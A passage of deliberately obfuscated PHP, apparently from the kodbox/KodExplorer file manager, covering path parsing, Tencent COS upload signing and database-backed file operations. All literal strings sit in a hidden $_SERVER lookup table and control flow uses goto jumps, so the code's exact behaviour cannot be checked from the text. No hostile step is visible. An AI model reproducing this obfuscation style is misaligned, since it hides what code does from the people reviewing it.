"\173\151\x6f\x7d"; const KOD_USER_RECENT = "\173\x75\163\x65\x72\x52\x65\156\x63\145\156\164\x7d"; const KOD_USER_DRIVER = "\173\144\x72\151\166\145\162\175"; public static function typeList() { $e©™·÷†ãâ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; return array($e©™·÷†ãâ[1089] => self::KOD_SOURCE, $e©™·÷†ãâ[1090] => self::KOD_USER_RECYCLE, $e©™·÷†ãâ[1091] => self::KOD_USER_FAV, $e©™·÷†ãâ[1092] => self::KOD_USER_FILE_TAG, $e©™·÷†ãâ[1093] => self::KOD_USER_FILE_TYPE, $e©™·÷†ãâ[1094] => self::KOD_GROUP_ROOT_SELF, $e©™·÷†ãâ[1095] => self::KOD_USER_SHARE, $e©™·÷†ãâ[1096] => self::KOD_USER_SHARE_LINK, $e©™·÷†ãâ[1097] => self::KOD_USER_SHARE_TO_ME, $e©™·÷†ãâ[1098] => self::KOD_SHARE_ITEM, $e©™·÷†ãâ[1099] => self::KOD_SHARE_LINK, $e©™·÷†ãâ[1100] => self::KOD_SEARCH, $e©™·÷†ãâ[1101] => self::KOD_BLOCK, $e©™·÷†ãâ[1102] => self::KOD_IO, $e©™·÷†ãâ[1103] => self::KOD_USER_RECENT, $e©™·÷†ãâ[1104] => self::KOD_USER_DRIVER); } public static function parse($d„°Û³°Æ) { goto fò†Õ×Î£; bÎÑÄæÜŒÑ: preg_match($Fšç³½Ò‡ø[1105], $d„°Û³°Æ, $dó”²ÖØèó); $AÎÔ‚êÖé = array($Fšç³½Ò‡ø[406] => !1, $Fšç³½Ò‡ø[1106] => !1, $Fšç³½Ò‡ø[403] => !1, $Fšç³½Ò‡ø[75] => $d„°Û³°Æ, $Fšç³½Ò‡ø[1016] => !1, $Fšç³½Ò‡ø[1015] => $Fšç³½Ò‡ø[33]); if (is_array($dó”²ÖØèó) && count($dó”²ÖØèó) == 5) { $b¥İÒ‹Ğ = $Fšç³½Ò‡ø[1107] . $dó”²ÖØèó[2] . $Fšç³½Ò‡ø[323]; if (in_array($b¥İÒ‹Ğ, $B²­Øœòƒ)) { $AÎÔ‚êÖé[$Fšç³½Ò‡ø[1016]] = $dó”²ÖØèó[1]; $AÎÔ‚êÖé[$Fšç³½Ò‡ø[29]] = $b¥İÒ‹Ğ; $AÎÔ‚êÖé[$Fšç³½Ò‡ø[1108]] = substr($b¥İÒ‹Ğ, 1, -1); $AÎÔ‚êÖé[$Fšç³½Ò‡ø[385]] = $dó”²ÖØèó[3]; } $AÎÔ‚êÖé[$Fšç³½Ò‡ø[1015]] = $dó”²ÖØèó[4]; } goto b÷‘ÊÂ©¥¶; fò†Õ×Î£: $Fšç³½Ò‡ø =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $d„°Û³°Æ = self::clear($d„°Û³°Æ); $B²­Øœòƒ = array_values(self::typeList()); goto bÎÑÄæÜŒÑ; b÷‘ÊÂ©¥¶: $f†ÔÍ®‚Ëİ = array($Fšç³½Ò‡ø[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $AÎÔ‚êÖé[$Fšç³½Ò‡ø[1070]] = in_array($AÎÔ‚êÖé[$Fšç³½Ò‡ø[29]], $f†ÔÍ®‚Ëİ); return $AÎÔ‚êÖé; goto B†ˆÕÍŞ×²; B†ˆÕÍŞ×²: } public static function clear($DÁ¸³Ãá—) { goto c¶ŠĞìÊ‰Ú; d±™‚…À: $DÁ¸³Ãá— = preg_replace($f•ñ„á Öà[1111], $f•ñ„á Öà[8], $DÁ¸³Ãá—); if ($DÁ¸³Ãá— == $f•ñ„á Öà[8]) { return $f•ñ„á Öà[8]; } $DÁ¸³Ãá— = rtrim($DÁ¸³Ãá—, $f•ñ„á Öà[8]); goto f§ğÔà™Ëˆ; eô„Øò©®‘: $bÎçÛÚ°› = $f•ñ„á Öà[1109]; if (substr($DÁ¸³Ãá—, 0, 3) == $f•ñ„á Öà[1110]) { $DÁ¸³Ãá— = substr($DÁ¸³Ãá—, 3); } while (strstr($DÁ¸³Ãá—, $bÎçÛÚ°›)) { $DÁ¸³Ãá— = str_replace($bÎçÛÚ°›, $f•ñ„á Öà[8], $DÁ¸³Ãá—); } goto d±™‚…À; f§ğÔà™Ëˆ: return $DÁ¸³Ãá—; goto f‚Ã°µËìÖ; c¶ŠĞìÊ‰Ú: $f•ñ„á Öà =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $DÁ¸³Ãá— = str_replace(array($f•ñ„á Öà[989], $f•ñ„á Öà[227]), $f•ñ„á Öà[50], $DÁ¸³Ãá—); $DÁ¸³Ãá— = str_replace($f•ñ„á Öà[96], $f•ñ„á Öà[8], $DÁ¸³Ãá—); goto eô„Øò©®‘; f‚Ã°µËìÖ: } public static function sourceID($A‹ ×Î…îÒ) { $aà„èÁñç =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $E†îî‡œ–· = self::parse($A‹ ×Î…îÒ); if ($E†îî‡œ–·[$aà„èÁñç[29]] !== self::KOD_SOURCE) { show_json(LNG($aà„èÁñç[1112]), !1); } return $E†îî‡œ–·[$aà„èÁñç[385]]; } public static function make($CÒ„öˆİ¯õ) { if (!$CÒ„öˆİ¯õ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($CÒ„öˆİ¯õ)); } public static function makeShare($fŠ®ÓœÍ“ó, $a«Ô¢‚Çô•) { return self::makePath(self::KOD_SHARE_ITEM, $fŠ®ÓœÍ“ó, $a«Ô¢‚Çô•); } public static function makeFileTypePath($aÛÓî‰„ÈÔ) { return self::makePath(self::KOD_USER_FILE_TYPE, $aÛÓî‰„ÈÔ); } public static function makeFileTagPath($aè×²Øƒä¿) { return self::makePath(self::KOD_USER_FILE_TAG, $aè×²Øƒä¿); } public static function makePath($F ÀÁÜ„óŒ, $A„äÆìáà = '', $EÀ–‰•òœö = '') { $f±Ä¥÷ÛÜŒ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $c¨µ‘‘Í£­ = substr($F ÀÁÜ„óŒ, 1, -1); $b†°ö×…´½ = $f±Ä¥÷ÛÜŒ[1113] . $c¨µ‘‘Í£­ . $f±Ä¥÷ÛÜŒ[1114] . $A„äÆìáà . $f±Ä¥÷ÛÜŒ[1115]; $b†°ö×…´½ = $EÀ–‰•òœö ? $b†°ö×…´½ . $EÀ–‰•òœö . $f±Ä¥÷ÛÜŒ[8] : $b†°ö×…´½; return $b†°ö×…´½; } public static function hashPath($cÒ×„¶Ş¢„) { $Cà”ª«ø¡ˆ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $b½¿‚ô˜½é = is_array($cÒ×„¶Ş¢„) ? $cÒ×„¶Ş¢„ : IO::info($cÒ×„¶Ş¢„); $dŒ›”ÜùÚß = _get($b½¿‚ô˜½é, $Cà”ª«ø¡ˆ[1116], $Cà”ª«ø¡ˆ[33]); if (!$dŒ›”ÜùÚß) { $fçäã¿ˆÅ = KodIO::parse($b½¿‚ô˜½é[$Cà”ª«ø¡ˆ[75]]); if (!$fçäã¿ˆÅ[$Cà”ª«ø¡ˆ[29]]) { $dŒ›”ÜùÚß = IO::hashSimple($b½¿‚ô˜½é[$Cà”ª«ø¡ˆ[75]]); } } if (!$dŒ›”ÜùÚß) { $dŒ›”ÜùÚß = md5($b½¿‚ô˜½é[$Cà”ª«ø¡ˆ[75]] . $b½¿‚ô˜½é[$Cà”ª«ø¡ˆ[77]] . $b½¿‚ô˜½é[$Cà”ª«ø¡ˆ[83]]); } return $dŒ›”ÜùÚß; } public static function initSystemPath() { goto C‹·Ó¡‚Ø„; DˆÄíùòî: define($eÆÀ©âˆ†è[1119], self::systemPath($eÆÀ©âˆ†è[1120])); define($eÆÀ©âˆ†è[1121], self::systemPath($eÆÀ©âˆ†è[1122])); define($eÆÀ©âˆ†è[1123], self::systemPath($eÆÀ©âˆ†è[1124])); goto EÛŸÏ’»ÇĞ; C‹·Ó¡‚Ø„: $eÆÀ©âˆ†è =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (defined($eÆÀ©âˆ†è[1117])) { return; } define($eÆÀ©âˆ†è[1117], self::systemPath($eÆÀ©âˆ†è[1118])); goto DˆÄíùòî; EÛŸÏ’»ÇĞ: IOHistory::bindEvent(); goto BÌ»…„‹­Ş; BÌ»…„‹­Ş: } public static function systemPath($f²¹æé“©à) { goto F´°„º©—Œ; e§‘–½¡éø: if ($fŒ¡•™›™) { return $fŒ¡•™›™; } if ($f²¹æé“©à == $CÑÜëõ±[1118]) { $fŒ¡•™›™ = self::make(Model($CÑÜëõ±[745])->systemRootPathAdd($CÑÜëõ±[1126])); } else { $fŒ¡•™›™ = self::systemPath($CÑÜëõ±[1118]); $C‚¼ßÊ´ù³ = self::sourceID($fŒ¡•™›™); $fŒ¡•™›™ = self::make(Model($CÑÜëõ±[745])->mkdir($C‚¼ßÊ´ù³, $f²¹æé“©à)); } Model($CÑÜëõ±[1075])->set($C¬ÍŸ‚Ï¶, $fŒ¡•™›™); goto aóË™ÓÆ¤ó; F´°„º©—Œ: $CÑÜëõ± =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $C¬ÍŸ‚Ï¶ = $CÑÜëõ±[1125] . ucfirst($f²¹æé“©à); $fŒ¡•™›™ = Model($CÑÜëõ±[1075])->get($C¬ÍŸ‚Ï¶); goto e§‘–½¡éø; aóË™ÓÆ¤ó: return $fŒ¡•™›™; goto dÄÌÔ ùñò; dÄÌÔ ùñò: } public static function systemFolder($f†­õÛÀ·ä) { $AŒœ–¨¡“¯ = IO_PATH_SYSTEM_SOURCE . $f†­õÛÀ·ä; $f„‚¿‰ç÷· = Cache::get($AŒœ–¨¡“¯); if (!$f„‚¿‰ç÷·) { $b£«”é… = IO::infoFull($AŒœ–¨¡“¯); if (!$b£«”é…) { $f„‚¿‰ç÷· = IO::mkdir($AŒœ–¨¡“¯, REPEAT_SKIP); } else { $f„‚¿‰ç÷· = $b£«”é…[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][75]]; } Cache::set($AŒœ–¨¡“¯, $f„‚¿‰ç÷·, 3600 * 10); } return $f„‚¿‰ç÷·; } public static function defaultDriver() { return Model($_SERVER[ó¬â¥‰ÊÔ¤Ç£][697])->defaultDriver(); } public static function defaultIO() { $e­ÏÊ†…Õ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $Aòœ¯é¥ñ = self::defaultDriver(); return $e­ÏÊ†…Õ[1127] . $Aòœ¯é¥ñ[$e­ÏÊ†…Õ[385]] . $e­ÏÊ†…Õ[1115]; } public static function defaultDriverInit() { static $cÒÓ–Êë‰¶ = false; if ($cÒÓ–Êë‰¶) { return $cÒÓ–Êë‰¶; } $cÒÓ–Êë‰¶ = IO::init(self::defaultIO()); return $cÒÓ–Êë‰¶; } public static function fileTypeList() { $fƒñ›´‚³å =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $a‹‚Ÿ…Ò  = $GLOBALS[$fƒñ›´‚³å[6]][$fƒñ›´‚³å[1128]]; foreach ($a‹‚Ÿ…Ò  as $D†”ÖÓñ¹¤ => $B¾£İêŠÉé) { $fŠ§¸Ôæ¤– = $fƒñ›´‚³å[1129] . $D†”ÖÓñ¹¤; $B›…ŸĞÔß = LNG($fŠ§¸Ôæ¤–); if ($fŠ§¸Ôæ¤– != $B›…ŸĞÔß) { $a‹‚Ÿ…Ò [$D†”ÖÓñ¹¤][$fƒñ›´‚³å[28]] = $B›…ŸĞÔß; } } return $a‹‚Ÿ…Ò ; } public static function transferType($f‚Ó“æŒ, $d¿£‹îîŞ) { goto aåØµß¨ÅÊ; A‰ïÁä¥ ¿: return $aÚ‡ùë‚íí[1132]; goto C½¼Ó¶¾œĞ; aåØµß¨ÅÊ: $aÚ‡ùë‚íí =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $AÖ·š„‚ÎÊ = self::driverType($f‚Ó“æŒ); $dé¹ŒÁ¡º = self::driverType($d¿£‹îîŞ); goto DµÕ×‰¡™­; DµÕ×‰¡™­: if ($AÖ·š„‚ÎÊ[$aÚ‡ùë‚íí[29]] == $dé¹ŒÁ¡º[$aÚ‡ùë‚íí[29]] && $AÖ·š„‚ÎÊ[$aÚ‡ùë‚íí[1130]] == $dé¹ŒÁ¡º[$aÚ‡ùë‚íí[1130]]) { return $aÚ‡ùë‚íí[1131]; } if ($AÖ·š„‚ÎÊ[$aÚ‡ùë‚íí[29]] == $aÚ‡ùë‚íí[778] && $dé¹ŒÁ¡º[$aÚ‡ùë‚íí[29]] == $aÚ‡ùë‚íí[105]) { return $aÚ‡ùë‚íí[1045]; } if ($AÖ·š„‚ÎÊ[$aÚ‡ùë‚íí[29]] == $aÚ‡ùë‚íí[105] && $dé¹ŒÁ¡º[$aÚ‡ùë‚íí[29]] == $aÚ‡ùë‚íí[778]) { return $aÚ‡ùë‚íí[106]; } goto A‰ïÁä¥ ¿; C½¼Ó¶¾œĞ: } public static function driverType($FªÄã‘ß…±) { goto E º ÚÚïº; e²¨Åàâòˆ: if ($Bª¦¹êªé‹ == $EµŞÒ…ŸÕ„[688] || $Bª¦¹êªé‹ == $EµŞÒ…ŸÕ„[1134] || $Bª¦¹êªé‹ == $EµŞÒ…ŸÕ„[1135]) { $FªÄã‘ß…± = self::defaultDriverInit(); } else { if ($Bª¦¹êªé‹ == $EµŞÒ…ŸÕ„[1052] || $Bª¦¹êªé‹ == $EµŞÒ…ŸÕ„[1136]) { $FªÄã‘ß…± = IO::init($FªÄã‘ß…±->pathParse[$EµŞÒ…ŸÕ„[999]]); } } $Bª¦¹êªé‹ = str_replace($EµŞÒ…ŸÕ„[1133], $EµŞÒ…ŸÕ„[33], strtolower($FªÄã‘ß…±->getType())); if ($Bª¦¹êªé‹ == $EµŞÒ…ŸÕ„[105]) { return array($EµŞÒ…ŸÕ„[29] => $EµŞÒ…ŸÕ„[105], $EµŞÒ…ŸÕ„[1130] => $EµŞÒ…ŸÕ„[33], $EµŞÒ…ŸÕ„[75] => $C™Òöí¤¤¬); } goto C¶®‚Ûä…á; C¶®‚Ûä…á: return array($EµŞÒ…ŸÕ„[29] => $EµŞÒ…ŸÕ„[778], $EµŞÒ…ŸÕ„[1130] => $FªÄã‘ß…±->pathDriver, $EµŞÒ…ŸÕ„[75] => $C™Òöí¤¤¬); goto E¿ÁğØôÔ; E º ÚÚïº: $EµŞÒ…ŸÕ„ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $C™Òöí¤¤¬ = $FªÄã‘ß…±->path; $Bª¦¹êªé‹ = str_replace($EµŞÒ…ŸÕ„[1133], $EµŞÒ…ŸÕ„[33], strtolower($FªÄã‘ß…±->getType())); goto e²¨Åàâòˆ; E¿ÁğØôÔ: } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($DÈ˜©áÁí) { parent::__construct($DÈ˜©áÁí); $this->signatureVersion($_SERVER[ó¬â¥‰ÊÔ¤Ç£][210]); } public function uploadFormData($aœŠšİò„ª, $f…¨Ê…ù×ó = 3600) { goto DŒŠ‹º„ìª; DŒŠ‹º„ìª: $EßË¿ñœ¬Á =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $féé¢àçœí = $EßË¿ñœ¬Á[191]; $F›’“Âí° = $EßË¿ñœ¬Á[228]; goto Aš¬ï†áÏ; aîêšŒ¢–Œ: $D¾›¯ˆĞ˜ê = array($EßË¿ñœ¬Á[1139] => $Dè¥¾¥ãË…, $EßË¿ñœ¬Á[1140] => array(array($EßË¿ñœ¬Á[1141] => $féé¢àçœí), array($EßË¿ñœ¬Á[1142] => $this->bucket), array($EßË¿ñœ¬Á[1143], $EßË¿ñœ¬Á[1144], $EßË¿ñœ¬Á[33]), array($EßË¿ñœ¬Á[1145] => $CÆğá‰‚¶), array($EßË¿ñœ¬Á[1146] => $F›’“Âí°), array($EßË¿ñœ¬Á[1147] => $this->accessKey), array($EßË¿ñœ¬Á[1148] => $b‚Ö µéÛ¯))); $D¾›¯ˆĞ˜ê = json_encode($D¾›¯ˆĞ˜ê); $CôÂ‹òƒ¯ = hash_hmac($EßË¿ñœ¬Á[228], $b‚Ö µéÛ¯, $this->secret); goto c÷½Í‘ŠæÓ; c÷½Í‘ŠæÓ: $b¿ŒÈõ­İ = sha1($D¾›¯ˆĞ˜ê); $c†Î‡‚ßˆ = hash_hmac($EßË¿ñœ¬Á[228], $b¿ŒÈõ­İ, $CôÂ‹òƒ¯); $BøîÂ«×ÇÁ = array($EßË¿ñœ¬Á[1141] => $féé¢àçœí, $EßË¿ñœ¬Á[1145] => $CÆğá‰‚¶, $EßË¿ñœ¬Á[1149] => base64_encode($D¾›¯ˆĞ˜ê), $EßË¿ñœ¬Á[1146] => $F›’“Âí°, $EßË¿ñœ¬Á[1147] => $this->accessKey, $EßË¿ñœ¬Á[1150] => $b‚Ö µéÛ¯, $EßË¿ñœ¬Á[1151] => $c†Î‡‚ßˆ, $EßË¿ñœ¬Á[175] => $this->getHost()); goto f™Ãë±ˆ‹†; f™Ãë±ˆ‹†: return $BøîÂ«×ÇÁ; goto bšåâ‡·ÖÚ; Aš¬ï†áÏ: $CÆğá‰‚¶ = $EßË¿ñœ¬Á[1137]; $Dè¥¾¥ãË… = gmdate($EßË¿ñœ¬Á[1138], time() + $f…¨Ê…ù×ó); $b‚Ö µéÛ¯ = (string) time() . $EßË¿ñœ¬Á[67] . (string) (time() + $f…¨Ê…ù×ó); goto aîêšŒ¢–Œ; bšåâ‡·ÖÚ: } public function fileOutLink($E‡´˜‹ó¯÷) { $eŸ–ÊÙ”äø =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (substr($E‡´˜‹ó¯÷, 0, 7) == $eŸ–ÊÙ”äø[1152]) { $E‡´˜‹ó¯÷ = $eŸ–ÊÙ”äø[1153] . substr($E‡´˜‹ó¯÷, 7); } header($eŸ–ÊÙ”äø[158] . $E‡´˜‹ó¯÷); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($dæµ½ÛŞ«®) { $this->pathParse = $dæµ½ÛŞ«®; $this->model = Model($_SERVER[ó¬â¥‰ÊÔ¤Ç£][1154]); } public function getPath($A§ãª¢¯¼) { return trim($A§ãª¢¯¼, $_SERVER[ó¬â¥‰ÊÔ¤Ç£][8]); } public function pathFather($C´ÏÕ¯Š˜£) { $b©©Ú¢¥Œã = $this->parse($C´ÏÕ¯Š˜£); $b©©Ú¢¥Œã = $this->infoSimple($C´ÏÕ¯Š˜£); return $b©©Ú¢¥Œã ? $b©©Ú¢¥Œã[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][479]] : !1; } public function pathThis($cš·í¶ø) { $f‰¶ô«‰‹ù = $this->infoSimple($cš·í¶ø); return $f‰¶ô«‰‹ù ? $f‰¶ô«‰‹ù[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][28]] : !1; } public function getPathOuter($eŞËÀÅ¦‹Ù) { if (!$eŞËÀÅ¦‹Ù) { return $eŞËÀÅ¦‹Ù; } $eô˜ğ–Ø­ = $this->parse($eŞËÀÅ¦‹Ù); return KodIO::make($eô˜ğ–Ø­[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][385]]); } public function copyFolderFromIO($cÙ¡‘†º¼ , $F¥Ñ‚—Ø³ˆ, $e’öÍÀªÁ—, $eô”øùÜ…, $DƒŠµÈæ—†) { $E ‰ÊÇÜ¬ = $this->model->copyFolderFromIO($cÙ¡‘†º¼ , $F¥Ñ‚—Ø³ˆ, $e’öÍÀªÁ—, $eô”øùÜ…, $DƒŠµÈæ—†); return KodIO::make($E ‰ÊÇÜ¬); } public function isParentOf($eºÊùÓ˜á·, $fá”ùù‘‡¼) { return $this->model->isParentOf($eºÊùÓ˜á·, $fá”ùù‘‡¼); } public function mkfile($c©—ŠÎà´†, $fùÂïÁ•Ù‘ = '', $AŸÀ¾ŠÈ¼ó = REPEAT_RENAME) { $déÔ»¯®Ä =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $E£ôù§«»¾ = $this->parse($c©—ŠÎà´†); $c©—ŠÎà´† = $E£ôù§«»¾[$déÔ»¯®Ä[385]]; for ($FÛ½ì ­òŒ = 0; $FÛ½ì ­òŒ < count($E£ôù§«»¾[$déÔ»¯®Ä[1155]]); $FÛ½ì ­òŒ++) { $bíÄíîÃŒ” = $E£ôù§«»¾[$déÔ»¯®Ä[1155]][$FÛ½ì ­òŒ]; if ($FÛ½ì ­òŒ == count($E£ôù§«»¾[$déÔ»¯®Ä[1155]]) - 1) { $c©—ŠÎà´† = $this->model->mkfile($c©—ŠÎà´†, $bíÄíîÃŒ”, $fùÂïÁ•Ù‘, $AŸÀ¾ŠÈ¼ó); break; } $c©—ŠÎà´† = $this->model->mkdir($c©—ŠÎà´†, $bíÄíîÃŒ”, REPEAT_SKIP); } return $this->getPathOuter($c©—ŠÎà´†); } public function mkdir($B‰­³áÔÃ¤, $A“£†©¼á = REPEAT_SKIP) { $Dâ¸Š‰­ò =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $B‹Ğ„ªÙ• = $this->parse($B‰­³áÔÃ¤); $B‰­³áÔÃ¤ = $B‹Ğ„ªÙ•[$Dâ¸Š‰­ò[385]]; for ($E‘ò±—¤½Ç = 0; $E‘ò±—¤½Ç < count($B‹Ğ„ªÙ•[$Dâ¸Š‰­ò[1155]]); $E‘ò±—¤½Ç++) { $fëŸÄ…õ¨ = $B‹Ğ„ªÙ•[$Dâ¸Š‰­ò[1155]][$E‘ò±—¤½Ç]; $B‰­³áÔÃ¤ = $this->model->mkdir($B‰­³áÔÃ¤, $fëŸÄ…õ¨, $A“£†©¼á); } return $this->getPathOuter($B‰­³áÔÃ¤); } public function copyFile($F± §ªäˆ, $e‚š¨”Ã´½, $B‚ßÏØï†Ï = REPEAT_REPLACE) { $B™Š¸³¨Ã =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $f³±™¨¤¢Ö = $this->parse($e‚š¨”Ã´½); $BÍ÷İÎï¼ = $this->model->copy($F± §ªäˆ, $f³±™¨¤¢Ö[$B™Š¸³¨Ã[385]], $B‚ßÏØï†Ï, $f³±™¨¤¢Ö[$B™Š¸³¨Ã[75]]); return $BÍ÷İÎï¼ ? $this->getPathOuter($BÍ÷İÎï¼) : !1; } public function moveFile($aÌŠ‰ŒÄí½, $fèÖÅÃÊå, $fåå´õ¿®å = REPEAT_REPLACE) { $EàÇöáÇ‡È =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $f‚•—‡‹Óë = $this->parse($fèÖÅÃÊå); $a‡Ù…ÛÆš´ = $this->model->move($aÌŠ‰ŒÄí½, $f‚•—‡‹Óë[$EàÇöáÇ‡È[385]], $fåå´õ¿®å, $f‚•—‡‹Óë[$EàÇöáÇ‡È[75]]); return $a‡Ù…ÛÆš´ ? $this->getPathOuter($a‡Ù…ÛÆš´) : !1; } public function copy($C×¾êäÍÁÉ, $dóÃ‚¼³‰å, $f¾´Š°Ø·› = REPEAT_REPLACE) { $B‘¾í‘Ñš˜ = $this->parse($dóÃ‚¼³‰å); $cË¦ÓôÜ«Ë = $this->model->copy($C×¾êäÍÁÉ, $B‘¾í‘Ñš˜[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][385]], $f¾´Š°Ø·›); return $cË¦ÓôÜ«Ë ? $this->getPathOuter($cË¦ÓôÜ«Ë) : !1; } public function moveSameAllow() { } public function move($B‹øÖŞÃÇÜ, $FÉ‘é´ò¼, $C•Š»®ñ¹ˆ = REPEAT_REPLACE) { $dÕÔÔªåĞ¥ = $this->parse($FÉ‘é´ò¼); $bÆ‹™Ã’šŸ = $this->model->move($B‹øÖŞÃÇÜ, $dÕÔÔªåĞ¥[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][385]], $C•Š»®ñ¹ˆ); return $bÆ‹™Ã’šŸ ? $this->getPathOuter($bÆ‹™Ã’šŸ) : !1; } public function remove($dÊÛŠÉŸõ, $bÏâ¿…±É = true) { return $this->model->remove($dÊÛŠÉŸõ, $bÏâ¿…±É); } public function rename($c‚Î’ãÀ, $F²‡ÄÆÂÉ«) { $BÅÁšõ ÷ = $this->model->rename($c‚Î’ãÀ, $F²‡ÄÆÂÉ«); return $BÅÁšõ ÷ ? $this->getPathOuter($c‚Î’ãÀ) : $BÅÁšõ ÷; } public function size($c×¯²à˜ë) { $f”ª±¾ÇÌ = $this->infoSimple($c×¯²à˜ë); return $f”ª±¾ÇÌ ? $f”ª±¾ÇÌ[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][77]] : 0; } public function infoSimple($c‡ì¤·¸˜) { return $this->model->sourceInfo($c‡ì¤·¸˜); } public function info($föì†ÈùÌŸ) { return $this->infoParse($föì†ÈùÌŸ); } public function infoAuth($EôÌ¦ÎÅÔå) { return $this->infoParse($EôÌ¦ÎÅÔå, !1, !0); } public function infoWithChildren($e­ƒãš—òë) { return $this->infoParse($e­ƒãš—òë, !0); } protected function infoParse($fƒ¹“Ÿ˜„¢, $c¤åÙ´îñ = false, $EÓƒéµ‚‚£ = false) { if (!$c¤åÙ´îñ) { return $this->model->pathInfo($fƒ¹“Ÿ˜„¢, $EÓƒéµ‚‚£); } return $this->model->pathInfoMore($fƒ¹“Ÿ˜„¢); } public function infoFull($fª‘Ì„Á) { $D¹÷½¦§„› =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $aÓˆøËÛë = explode($D¹÷½¦§„›[8], $fª‘Ì„Á); $dğ­Öœ‰‹ê = implode($D¹÷½¦§„›[8], array_splice($aÓˆøËÛë, 1)); return $this->model->pathInfoByPath($aÓˆøËÛë[0], $dğ­Öœ‰‹ê); } public function hashSimple($c‚£´‚ÓÙ) { $CëÃè˜á† =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $fà¬Ô¿ä = $this->infoWithChildren($c‚£´‚ÓÙ); return $fà¬Ô¿ä[$CëÃè˜á†[163]][$CëÃè˜á†[170]]; } public function hashMd5($c¦¯Ü³â¼ğ) { $EßÅÊ¦éš =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $cçÉ´†Å¦ì = $this->infoWithChildren($c¦¯Ü³â¼ğ); return $cçÉ´†Å¦ì[$EßÅÊ¦éš[163]][$EßÅÊ¦éš[169]]; } public function exist($aï¨Ñ¹¥ˆ) { $dÄ…ä—Õ¿ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $dªµËÖÄ§ = $this->parse($aï¨Ñ¹¥ˆ); if (!$dªµËÖÄ§[$dÄ…ä—Õ¿[75]]) { return $this->isFile($aï¨Ñ¹¥ˆ) || $this->isFolder($aï¨Ñ¹¥ˆ); } $FâñÑäÎ‹ø = array($dÄ…ä—Õ¿[386] => $dªµËÖÄ§[$dÄ…ä—Õ¿[385]], $dÄ…ä—Õ¿[28] => $dªµËÖÄ§[$dÄ…ä—Õ¿[75]]); $A´ßŞ¢åè– = $this->model->where($FâñÑäÎ‹ø)->find(); return $A´ßŞ¢åè– ? !0 : !1; } public function isFile($b–Œ°•‹‰ó) { $F†´ŞËˆš =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $cíÊôĞéô‰ = $this->infoSimple($b–Œ°•‹‰ó); return $cíÊôĞéô‰ && $cíÊôĞéô‰[$F†´ŞËˆš[388]] == $F†´ŞËˆš[86] ? !1 : !0; } public function isFolder($Dš ¿‘£´æ) { $BéÅäí¡ÃÁ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $B•õæ¾ß‹ = $this->infoSimple($Dš ¿‘£´æ); return $B•õæ¾ß‹ && $B•õæ¾ß‹[$BéÅäí¡ÃÁ[388]] == $BéÅäí¡ÃÁ[86] ? !0 : !1; } public function listPath($dÎ²¤­¸³, $B²¸ì¤Æí¡ = false) { $b¹½×…‡×Û =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($dÎ²¤­¸³ == $b¹½×…‡×Û[33]) { return !1; } $b×¸ÅóŞà = array($b¹½×…‡×Û[386] => $dÎ²¤­¸³); if ($B²¸ì¤Æí¡) { return $this->model->listSource($b×¸ÅóŞà, -1); } return $this->model->listSource($b×¸ÅóŞà); } public function has($bøĞ¬‡Âˆ, $Fï¥ôÅˆì„ = false, $AÁ¹¦‰å± = null) { $bÀ¡±÷Ğ±¸ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $AËÅñøóÁ = $this->infoWithChildren($bøĞ¬‡Âˆ); if ($Fï¥ôÅˆì„) { return array($bÀ¡±÷Ğ±¸[202] => $AËÅñøóÁ[$bÀ¡±÷Ğ±¸[202]], $bÀ¡±÷Ğ±¸[201] => $AËÅñøóÁ[$bÀ¡±÷Ğ±¸[201]]); } return $AÁ¹¦‰å± ? $AËÅñøóÁ[$bÀ¡±÷Ğ±¸[202]] : $AËÅñøóÁ[$bÀ¡±÷Ğ±¸[201]]; } public function listAll($e¸“äŒ‹—´) { $E¯¯•¬©¡ï = IO::info($this->pathParse[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][75]]); if (!$E¯¯•¬©¡ï) { return array(); } return $this->model->listAll($e¸“äŒ‹—´); } public function getContent($FØ¾Ê‹­½“) { return $this->model->getContent($FØ¾Ê‹­½“); } public function setContent($d¨äÏŸ§‹, $FËñèÖÓ®ç = '') { return $this->model->setContent($d¨äÏŸ§‹, $FËñèÖÓ®ç); } public function fileSubstr($A¶÷¶½Ïø´, $A’Š­ÂÒ˜—, $BÖ¬¶ÏÊ°Ö) { return $this->model->fileSubstr($A¶÷¶½Ïø´, $A’Š­ÂÒ˜—, $BÖ¬¶ÏÊ°Ö); } public function download($eæ”‹•éï¬, $f†æ©Í¬á = '') { $C…ƒë¬‡Ü = 